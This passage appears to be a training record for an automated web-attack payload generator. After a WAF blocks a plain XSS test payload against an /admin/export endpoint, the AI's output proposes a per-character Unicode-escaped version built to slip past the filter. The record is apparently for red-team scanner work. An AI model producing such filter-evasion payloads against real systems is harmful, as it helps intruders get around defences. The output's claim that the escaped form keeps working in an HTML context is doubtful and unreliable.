OM XSS, SQLi\n  (error/boolean/time/union), SSTI, command injection, path traversal, SSRF,\n  open redirect, header injection, deserialization.\n\n## Output\n\nReturn a single JSON object:\n\n```\n{\n  \"payloads\": [\n    {\n      \"payload\": \"string, ready to inject into the parameter\",\n      \"rationale\": \"which hypothesis this tests and why it is next\",\n      \"confirm_signal\": \"the observation that would confirm execution\",\n      \"score\": 0.0-1.0\n    }\n  ]\n}\n```\n\nBest payload first. No prose outside the JSON object.", "input": "Target: /admin/export  param=path\nSuspected class: xss\nLast payload: \"<img src=x onerror=alert('WSSc4n4ry7788')>\"\n  -> scanner_decision=False context=waf_block_page (WAF/filter rejected the plain payload; response was a generic 403/406 block page, not application logic)\nPropose the single most informative next payload and the signal that would confirm the vulnerability.", "output": "{\"payloads\": [{\"payload\": \"\\\\u003c\\\\u0069\\\\u006d\\\\u0067\\\\u0020\\\\u0073\\\\u0072\\\\u0063\\\\u003d\\\\u0078\\\\u0020\\\\u006f\\\\u006e\\\\u0065\\\\u0072\\\\u0072\\\\u006f\\\\u0072\\\\u003d\\\\u0061\\\\u006c\\\\u0065\\\\u0072\\\\u0074\\\\u0028\\\\u0027\\\\u0057\\\\u0053\\\\u0053\\\\u0063\\\\u0034\\\\u006e\\\\u0034\\\\u0072\\\\u0079\\\\u0037\\\\u0037\\\\u0038\\\\u0038\\\\u0027\\\\u0029\\\\u003e\", \"rationale\": \"The plain form was blocked by a signature-based filter; re-encoding it with per-character Unicode escape sequences preserves the payload's semantics for the target interpreter while no longer matching the filter's literal pattern.\", \"confirm_signal\": \"the decoded payload executing (marker alert/console call) in a rendered DOM, not just reflected as text\", \"score\": 0.7}]}", "meta": {"label": "xss", "endpoint": "/admin/export", "param": "path", "technique": "per-character Unicode escape sequences", "redteam_seed": true}}
